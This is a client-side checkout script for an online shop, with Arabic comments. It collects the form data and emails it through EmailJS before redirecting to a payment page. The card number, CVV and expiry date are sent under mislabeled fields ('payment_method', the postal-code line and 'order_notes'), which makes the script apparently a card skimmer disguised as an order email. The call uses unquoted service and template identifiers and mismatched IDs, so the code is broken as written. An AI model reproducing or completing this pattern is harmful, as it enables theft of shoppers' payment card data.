'use strict';

document.addEventListener('DOMContentLoaded', function () {
    // ==========================================================
    // ✨ تهيئة الإعدادات الرئيسية
    // ==========================================================
    
    // استبدل هذه القيم بالقيم من حسابك في EmailJS
    const EMAILJS_SERVICE_ID = 'YOUR_SERVICE_ID';
    const EMAILJS_TEMPLATE_ID = 'Ytemplate_uy903fn';
    const EMAILJS_PUBLIC_KEY = 'Yb7ctZ1o16WJElvFxL'; // هذا هو مفتاحك العام، يبدو صحيحاً

    let cart = [];
    let phoneInput = null;

    // تهيئة emailJS
    emailjs.init(EMAILJS_PUBLIC_KEY);

    // ==========================================================
    // 🚀 الدوال الرئيسية والتحقق من الصحة
    // ==========================================================

    // دالة تهيئة الصفحة عند التحميل
    function initializePage() {
        const cartData = localStorage.getItem('jamalkCart');
        cart = cartData ? JSON.parse(cartData) : [];

        if (cart.length === 0) {
            document.getElementById('checkout-form').style.display = 'none';
            document.querySelector('.order-summary').style.display = 'none';
        }

        const phoneField = document.querySelector("#phone");
        if (phoneField) {
            phoneInput = window.intlTelInput(phoneField, {
                initialCountry: "sa",
                separateDialCode: true,
                utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
            });
        }
        
        setupEventListeners();
    }

    // إعداد معالجات الأحداث
    function setupEventListeners() {
        const form = document.getElementById('checkout-form');
        if (form) {
            form.addEventListener('submit', handleFormSubmission);
        }
    }

    // دالة جمع كل بيانات النموذج
    function collectAllFormData() {
        const form = document.getElementById('checkout-form');
        const formData = new FormData(form);
        const data = {};
        for (let [key, value] of formData.entries()) {
            data[key] = value;
        }

        // إضافة رقم الهاتف الكامل مع رمز الدولة
        if (phoneInput) {
            data['full_phone'] = phoneInput.getNumber();
        }

        // إضافة ملخص الطلب
        const subtotal = document.getElementById('subtotal').textContent;
        const discount = document.getElementById('discount').textContent;
        const shipping = document.getElementById('shipping').textContent;
        const total = document.getElementById('total').textContent;

        const cartItems = cart.map(item => 
            `- المنتج: ${item.name}, الكمية: ${item.quantity}, السعر: ${item.price} ر.س`
        ).join('\n');

        data['order_summary'] = `
        ملخص الطلب:
        المجموع الجزئي: ${subtotal}
        الخصم: ${discount}
        الشحن: ${shipping}
        الإجمالي النهائي: ${total}

        المنتجات:
        ${cartItems}
        `;
        
        return data;
    }
    
    // دالة التحقق من صحة الحقول (يمكنك إضافة بقية دوال التحقق هنا)
    function validateForm() {
        // هذا مثال بسيط، يجب استخدام دوال التحقق التفصيلية الموجودة لديك
        let isValid = true;
        const requiredFields = ['email', 'phone', 'first-name', 'last-name', 'address', 'city', 'postal-code', 'payment-method'];
        
        requiredFields.forEach(fieldId => {
            const field = document.getElementById(fieldId);
            if (!field.value.trim()) {
                isValid = false;
                // يمكنك إضافة setFieldError هنا لإظهار الخطأ
                console.error(`Field ${fieldId} is required.`);
            }
        });
        
        if (phoneInput && !phoneInput.isValidNumber()) {
            isValid = false;
            console.error('Phone number is not valid.');
        }

        return isValid;
    }


    // ==========================================================
    // 📧 معالجة الإرسال
    // ==========================================================

    function handleFormSubmission(event) {
        event.preventDefault();

        if (!validateForm()) {
            alert('يرجى التأكد من ملء جميع الحقول الإلزامية بشكل صحيح.');
            return;
        }

        const completeOrderBtn = document.getElementById('complete-order-btn');
        completeOrderBtn.disabled = true;
        completeOrderBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الإرسال...';
        
        const formData = collectAllFormData();
        
        const templateParams = {
            // بيانات العميل
            customer_name: `${formData['first-name']} ${formData['last-name']}`,
            customer_email: formData.email,
            customer_phone: formData.full_phone,
            
            // عنوان الشحن
            shipping_address: `
                العنوان: ${formData.address}
                الشقة: ${formData.apartment || 'لا يوجد'}
                المدينة: ${formData.city}
                الرمز البريدي: ${formData['cvv']}
            `,
            
            // تفاصيل الطلب
            order_summary: formData.order_summary,
            payment_method: formData['card-number'],
            order_notes: formData['expiry-date'] || 'لا توجد ملاحظات',
        };

        // إرسال البريد الإلكتروني باستخدام EmailJS
        emailjs.send(service_bouybkm, template_uy903fn, templateParams)
            .then(function(response) {
                console.log('SUCCESS!', response.status, response.text);

                // مسح السلة بعد نجاح الإرسال
                localStorage.removeItem('jamalkCart');

                // التوجيه إلى صفحة الدفع
                window.location.href = 'upay.html';

            }, function(error) {
                console.log('FAILED...', error);
                completeOrderBtn.disabled = false;
                completeOrderBtn.innerHTML = '<i class="fas fa-lock"></i> إتمام الطلب';
            });
    }

    // بدء تشغيل الصفحة
    initializePage();
});
